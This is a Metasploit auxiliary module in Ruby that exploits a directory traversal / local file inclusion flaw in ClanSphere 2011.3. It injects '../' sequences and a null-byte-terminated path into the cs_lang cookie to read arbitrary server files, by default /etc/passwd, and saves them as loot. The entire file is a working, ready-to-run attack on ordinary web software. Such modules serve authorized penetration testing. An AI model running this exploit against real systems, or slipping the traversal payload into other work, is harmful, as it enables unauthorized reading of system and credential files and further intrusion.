##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ClanSphere 2011.3 Local File Inclusion Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal flaw found in Clansphere 2011.3.
        The application fails to handle the cs_lang parameter properly, which can be
        used to read any file outside the virtual directory.
      },
      'References'     =>
        [
          ['OSVDB', '86720'],
          ['EDB', '22181']
        ],
      'Author'         =>
        [
          'blkhtc0rp',  #Original
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2012-10-23'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),
        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
      ])
  end


  def run_host(ip)
    base = normalize_uri(target_uri.path)

    peer = "#{ip}:#{rport}"

    print_status("Reading '#{datastore['FILE']}'")

    traverse = "../" * datastore['DEPTH']
    f = datastore['FILE']
    f = f[1, f.length] if f =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(base, "index.php"),
      'cookie' => "blah=blah; cs_lang=#{traverse}#{f}%00.png"
    })

    if res and res.body =~ /^Fatal error\:/
      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
      print_error("\t1. File does not exist.")
      print_error("\t2. No permission.")
      print_error("\t3. #{ip} isn't vulnerable to null byte poisoning.")

    elsif res and res.code == 200
      pattern_end = "     UTC +1 - Load:"
      data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC/).flatten[0].lstrip
      fname = datastore['FILE']
      p = store_loot(
        'clansphere.cms',
        'application/octet-stream',
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{fname} stored as '#{p}'")

    else
      print_error("Fail to obtain file for some unknown reason")
    end
  end
end
